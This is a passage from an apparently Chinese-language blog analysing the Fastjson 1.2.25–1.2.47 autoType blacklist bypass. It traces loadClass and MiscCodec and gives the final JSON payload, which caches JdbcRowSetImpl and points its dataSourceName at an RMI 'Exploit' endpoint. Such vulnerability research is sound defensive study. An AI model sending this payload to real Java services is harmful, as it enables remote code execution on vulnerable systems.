<p>在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。如何才能在这两步中将我们的恶意类加载进去呢？</p>
<p>先看 deserializers ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p>
<ul>
<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
</ul>
<p>因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 <code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
<p>同样的，这个方法从 <code>TypeUtils.mappings</code> 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p>
<ul>
<li><code>addBaseClassMappings()</code>：无入参，加载</li>
<li><code>loadClass()</code>：关键函数</li>
</ul>
<p>接下来看一下 <code>loadClass()</code> 的代码：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span style="color:#fff;font-weight:bold">boolean</span> cache) {
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 非空判断
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(className == <span style="color:#fff;font-weight:bold">null</span> || className.<span style="color:#007f7f">length</span>() == <span style="color:#ff0;font-weight:bold">0</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 防止重复添加
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Class&lt;?&gt; clazz = mappings.<span style="color:#007f7f">get</span>(className);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span>(clazz != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 判断 className 是否以 [ 开头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">0</span>) == <span style="color:#0ff;font-weight:bold">&#39;[&#39;</span>){
</span></span><span style="display:flex;"><span>            Class&lt;?&gt; componentType = loadClass(className.<span style="color:#007f7f">substring</span>(<span style="color:#ff0;font-weight:bold">1</span>), classLoader);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> Array.<span style="color:#007f7f">newInstance</span>(componentType, <span style="color:#ff0;font-weight:bold">0</span>).<span style="color:#007f7f">getClass</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 判断 className 是否 L 开头 ; 结尾
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(className.<span style="color:#007f7f">startsWith</span>(<span style="color:#0ff;font-weight:bold">&#34;L&#34;</span>) &amp;&amp; className.<span style="color:#007f7f">endsWith</span>(<span style="color:#0ff;font-weight:bold">&#34;;&#34;</span>)){
</span></span><span style="display:flex;"><span>            String newClassName = className.<span style="color:#007f7f">substring</span>(<span style="color:#ff0;font-weight:bold">1</span>, className.<span style="color:#007f7f">length</span>() - <span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> loadClass(newClassName, classLoader);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#fff;font-weight:bold">if</span>(classLoader != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                clazz = classLoader.<span style="color:#007f7f">loadClass</span>(className);
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (cache) {
</span></span><span style="display:flex;"><span>                    mappings.<span style="color:#007f7f">put</span>(className, clazz);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span>(Throwable e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// skip
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            ClassLoader contextClassLoader = Thread.<span style="color:#007f7f">currentThread</span>().<span style="color:#007f7f">getContextClassLoader</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(contextClassLoader != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; contextClassLoader != classLoader){
</span></span><span style="display:flex;"><span>                clazz = contextClassLoader.<span style="color:#007f7f">loadClass</span>(className);
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (cache) {
</span></span><span style="display:flex;"><span>                    mappings.<span style="color:#007f7f">put</span>(className, clazz);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span>(Throwable e){
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// skip
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            clazz = Class.<span style="color:#007f7f">forName</span>(className);
</span></span><span style="display:flex;"><span>            mappings.<span style="color:#007f7f">put</span>(className, clazz);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span>(Throwable e){
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// skip
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>由以上代码可知，只要我们能够控制这个方法的参数，就可以往 <code>mappings</code> 中写入任意类名。
<code>loadClass</code> 一共有三个重载方法，如下图：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014195119193.png" alt="image-20221014195119193"  />
</p>
<p>我们需要找到调用这些方法的类，并看是否能够为我们控制：</p>
<ul>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>：调用链均在 <code>checkAutoType()</code> 和 <code>TypeUtils</code> 里自调用，略过。</li>
<li><code>Class&lt;?&gt; loadClass(String className)</code>：除了自调用，有一个 <code>castToJavaBean()</code> 方法，暂未研究。</li>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>：方法调用三个参数的重载方法，并添加参数 <code>true</code> ，也就是会加入参数缓存中。</li>
</ul>
<p>重点看一下两个参数的 <code>loadClass</code> 方法在哪调用：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image46_2.png" alt="46_2"  />
</p>
<p>在这里我们关注 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 方法，这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 <code>Class.class</code> 类，成为了我们的入口。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014195720161.png" alt="image-20221014195720161"  />
</p>
<p>如果 <code>parser.resolveStatus</code> 为<code>TypeNameRedirect</code>（值为2） 时，进入 <code>if</code> 语句，会解析 <code>val</code> 中的内容并放入 <code>objVal</code> 中，然后传入 <code>strVal</code> 中。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014195916805.png" alt="image-20221014195916805"  />
</p>
<p>后面的逻辑如果 <code>class</code> 是 <code>Class.class</code> 时，将会调用 <code>loadClass</code> 方法，将 <code>strVal</code> 进行类加载并缓存：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014200115296.png" alt="image-20221014200115296"  />
</p>
<h4 id="小结">小结<a hidden class="anchor" aria-hidden="true" href="#小结">#</a></h4>
<p>首先要避开<code>checkAutoType()</code>中<code>autoTypeSupport</code> 默认为 <code>false</code> 时的检查，从两个<code>if</code>判断语句入手发现只有<code>TypeUtils.getClassFromMapping(typeName)</code>可能对<code>clazz</code>赋值使用两个参数的<code>loadclass</code>向<code>mapping</code>中赋值<code>MiscCodec#deserialze</code> 方法调用了两个参数的<code>loadclass</code>.调用之前需要满足<code>parser.resolveStatus</code> 为<code>TypeNameRedirect</code>（值为2） 时，其中一个<code>key</code>为 <code>val</code> ，此时会将<code>val</code>的内容放入 <code>objVal</code> 中，然后传入 <code>strVal</code> 中。
接着如果 <code>class</code> 是 <code>Class.class</code> 时，将会调用 <code>loadClass</code> 方法，将 <code>strVal</code> 进行类加载并缓存。</p>
<p>所以可以将恶意类名存到<code>val</code>中，这就完成了恶意类的加载，可以避开异常的抛出。
如何满足<code>parser.resolveStatus</code> 为<code>TypeNameRedirect</code>（值为2），在后面调试中会讲到</p>
<h4 id="调试">调试<a hidden class="anchor" aria-hidden="true" href="#调试">#</a></h4>
<p>我们先构造一个 json ：<code>{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;reus09&quot;}</code> ，调试一下：</p>
<p><code>JSON.parseObject()</code> 调用 <code>DefaultJSONParser</code> 对 JSON 进行解析。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014201102367.png" alt="image-20221014201102367"  />
</p>
<p><code>DefaultJSONParser.parseObject()</code> 调用 <code>checkAutoType()</code> 检查待加载类的合法性。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014201422109.png" alt="image-20221014201422109"  />
</p>
<p>由于 deserializers 在初始化时将 <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014200808338.png" alt="image-20221014200808338"  />
</p>
<p><code>DefaultJSONParser.parseObject()</code> 设置 resolveStatus 为 2。<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202019095.png" alt="image-20221014202019095"  />
</p>
<p><code>DefaultJSONParser.parseObject()</code> 根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202129027.png" alt="image-20221014202129027"  />
</p>
<p>解析 json 中 “val” 中的内容，并放入 objVal 中，如果不是 &ldquo;val&rdquo; 将会报错。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202252945.png" alt="image-20221014202252945"  />
</p>
<p>传递至 strVal 并使用 <code>loadClass</code> 加载并缓存。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202340313.png" alt="image-20221014202340313"  />
</p>
<p>此时恶意的 val 成功被我们加载到 mappings 中，再次以恶意类进行 <code>@type</code> 请求时即可绕过黑名单进行的阻拦，因此最终 payload 为：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;reus09&#34;</span>: {
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;java.lang.Class&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;val&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style="display:flex;"><span>	},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;reus09&#34;</span>: {
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;dataSourceName&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;autoCommit&#34;</span>: <span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202656498.png" alt="image-20221014202656498"  />
</p>
<h4 id="影响版本分析">影响版本分析<a hidden class="anchor" aria-hidden="true" href="#影响版本分析">#</a></h4>
<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport，才可以被利用
影响版本：1.2.33 &lt;= fastjson &lt;= 1.2.47不论是否开启AutoTypeSupport，都可以被利用。</p>
<p>两者在<code>checkAutoType</code>实现的逻辑其实差不多，其实就是后者对黑名单识别命中报错的时候，额外加了条件，该类无法从缓存<code>mappings</code>中找到才会报错。</p>
<p>两者实现原理本质上都是代码执行顺序的绕过。</p>
<h5 id="1225--fastjson--1232">1.2.25 &lt;= fastjson &lt;= 1.2.32<a hidden class="anchor" aria-hidden="true" href="#1225--fastjson--1232">#</a></h5>
<h6 id="autotypesupport为true">autoTypeSupport为true<a hidden class="anchor" aria-hidden="true" href="#autotypesupport为true">#</a></h6>
<p>在该版本中的<code>checkAutoType</code>方法中，如果识别到黑名单里面的类直接报错<code>autoType is not support.</code></p>
<p>在名黑单识别后执行才执行<code>getClassFromMapping</code>方法和<code>findClass</code>方法。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419180628036.png" alt="image-20230419180628036"  />
</p>
<p>在解析我们的第一段<code>payload</code>的时候</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#f00">reus</span><span style="color:#ff0;font-weight:bold">09</span><span style="color:#0ff;font-weight:bold">&#34;: {
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">		&#34;</span><span style="color:#f00">@type</span><span style="color:#0ff;font-weight:bold">&#34;: &#34;</span><span style="color:#f00">java.lang.Class</span><span style="color:#0ff;font-weight:bold">&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">		&#34;</span><span style="color:#f00">val</span><span style="color:#0ff;font-weight:bold">&#34;: &#34;</span><span style="color:#f00">com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f00">},</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为<code>@type</code>指定的类<code>java.lang.Class</code>不属于黑名单，并且可以在<code>clazz = this.deserializers.findClass(typeName);</code>获得对应的反序列化<code>MiscCodec</code>，在它的<code>deserialze</code>方法中实现了<code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>方法，将对应的<code>val</code>的值加入到<code>mappings</code>里面。</p>
<p>但是在解析第二段<code>payload</code> 的时候</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span><span style="color:#f00">:</span> {
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;dataSourceName&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
